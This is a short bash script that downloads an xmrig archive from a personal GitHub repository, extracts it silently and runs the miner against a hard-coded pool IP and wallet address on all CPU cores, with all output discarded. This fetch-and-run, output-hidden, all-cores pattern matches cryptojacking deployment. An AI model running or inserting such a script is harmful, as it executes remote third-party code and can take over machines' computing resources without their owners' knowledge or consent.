#!/bin/bash
A=157.230.255.104:443
B=8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB
C=GAS
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
